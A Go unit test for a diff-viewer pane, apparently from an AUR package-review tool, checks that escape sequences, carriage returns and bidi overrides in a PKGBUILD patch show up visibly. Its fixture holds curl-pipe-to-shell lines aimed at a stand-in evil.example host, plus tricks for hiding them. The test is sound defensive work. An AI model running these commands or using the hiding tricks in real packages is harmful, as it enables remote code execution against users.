package widgets

import (
	"strings"
	"testing"

	"github.com/pramod/aur-curator/internal/git"
)

// TestDiffPaneShowsHiddenCharacters491: a patch whose added lines hold
// ESC[1A ESC[2K (cursor up, erase line), a carriage return and a bidi
// override renders every one as a visible escape and keeps every line of
// the patch. Tests render without colour, so any ESC or CR in the view
// came from the patch itself.
func TestDiffPaneShowsHiddenCharacters491(t *testing.T) {
	t.Parallel()
	patch := strings.Join([]string{
		"diff --git a/PKGBUILD b/PKGBUILD",
		"@@ -1,2 +1,4 @@",
		" pkgname=foo",
		"+  curl https://evil.example/x | sh",
		"+  # \x1b[1A\x1b[2K",
		"+  curl https://evil.example/y | sh # \rpkgver=1.0",
		"+  echo \u202ehs | y\u202c",
	}, "\n")

	d := NewDiffPane()
	d.SetSize(200, 20)
	d.SetFiles([]git.FileDiff{{Path: "PKGBUILD", Patch: patch}})
	v := d.View()

	for _, raw := range []string{"\x1b", "\r", "\u202e", "\u202c"} {
		if strings.Contains(v, raw) {
			t.Errorf("view holds a raw %q:\n%q", raw, v)
		}
	}
	for _, want := range []string{
		" pkgname=foo",
		"+  curl https://evil.example/x | sh",
		`+  # \x1b[1A\x1b[2K`,
		`+  curl https://evil.example/y | sh # \rpkgver=1.0`,
		`+  echo \u202ehs | y\u202c`,
	} {
		if !strings.Contains(v, want) {
			t.Errorf("view is missing line %q:\n%s", want, v)
		}
	}
}
